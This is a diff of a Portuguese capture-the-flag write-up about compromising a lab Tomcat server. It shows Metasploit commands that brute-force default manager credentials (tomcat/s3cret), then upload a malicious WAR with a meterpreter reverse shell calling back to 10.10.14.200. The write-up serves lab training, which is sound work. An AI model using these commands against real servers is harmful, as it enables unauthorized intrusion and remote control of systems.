@@ -61,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Um servidor web apache tomcat. Acessando o http://10.10.10.95:8080 temos a mensagem que "If you're seeing this, you've successfully installed Tomcat. Congratulations!". É uma instalação padrão sem muito a oferecer. O botão "Server Status" nos leva ao link: http://10.10.10.95:8080/manager/status onde é listado que o servidor é um Windows Server 2012 R2, a versão do jvm e outras coisinhas. Informações que podem ser úteis no futuro.
 
 Por alguns minutos procurei como configurações default do tomcat poderiam permitir uma hackeada e não encontrei algo interessante. O Dirbuster também não estava dando resultados.
-Ok... Hora de pensar melhor. Estava com sono e apenas seguindo uns passos padrões tipo nmap, dirbuster e exploração de algo óbvio. Mas não é assim que se faz essa porra. Foi hora de dar um passo atrás e repensar no que tinha até o momento, afinal, pela avaliação da galera, essa máquina deveria ser fácilima. E a única coisa que parecia ser a porta de entrada era a o http://10.10.10.95:8080/manager. Claro que já havia tentado umas senhas padrão ridículas como admin/admin mas quem sabe não havia algo além? Em meio as minhas pesquisas em relação a essa página de login vi esse módulo auxiliar do metasploit: https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login e pensei: por que não?
+Ok... Hora de pensar melhor. Estava com sono e apenas seguindo uns passos padrões tipo nmap, dirbuster e exploração de algo óbvio. Mas não é assim que se faz essa porra. Foi hora de dar um passo atrás e repensar no que tinha até o momento, afinal, pela avaliação da galera, essa máquina deveria ser fácilima. E a única coisa que parecia ser a porta de entrada era a o http://10.10.10.95:8080/manager. Claro que já havia tentado umas senhas padrão ridículas como admin/admin mas quem sabe não havia algo além? Em meio as minhas pesquisas em relação a essa página de login vi esse módulo auxiliar do metasploit: [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login) e pensei: por que não?
 
 ```
 msf > use auxiliary/scanner/http/tomcat_mgr_login
@@ -105,7 +105,7 @@ Eu realmente não acreditava que isso ia dar em algum lugar. Eles me ensinaram q
 Mas olhe só... O usuário tomcat usa a senha secreta s3cret. Agora sim temos algo útil.
 Ao acessar o manager, temos as aplicações que estão rodando no servidor e temos o poder de dar deploy em um arquivo war nosso, em outras palavras: execução de código que com certeza será malicioso. Se você não sabe, deveria pesquisar sobre o que é um deploy em um servidor tomcat, como o java faz as coisas e os carais. Não seja um kiddie que vai setar as coisas no metasploit e sair rodando. Que seja. Foda-se. Na verdade, um kiddie não faria ideia do que fazer ao ver uma página como essa onde não dá pra upar seu c99.php. C99... Estou velho. Seja um kiddie, seja feliz. Vote 666 e desbloqueie o Enéas na urna eletrônica.
 
-Agora sim essa máquina ficou fácil pra carai. E o metasploit, convenientemente, tem um outro módulo para fazer upload e executar um war maliciosissimo em um server que se tenha o usuário e senha: https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload
+Agora sim essa máquina ficou fácil pra carai. E o metasploit, convenientemente, tem um outro módulo para fazer upload e executar um war maliciosissimo em um server que se tenha o usuário e senha: [https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload)
 
 ```
 msf exploit(multi/http/tomcat_mgr_upload) > set HttpPassword s3cret
@@ -125,10 +125,10 @@ msf exploit(multi/http/tomcat_mgr_upload) > set PAYLOAD windows/meterpreter_reve
 msf exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.10.14.200
 ```
 
-Não seria legal se ao invés de "run" ou "exploit" o comando fosse "fode_essa_porra"?
+E mandar um exploit.
 
 ```
-msf exploit(multi/http/tomcat_mgr_upload) > fode_essa_porra
+msf exploit(multi/http/tomcat_mgr_upload) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.200:4444 
 [*] Retrieving session ID and CSRF token...
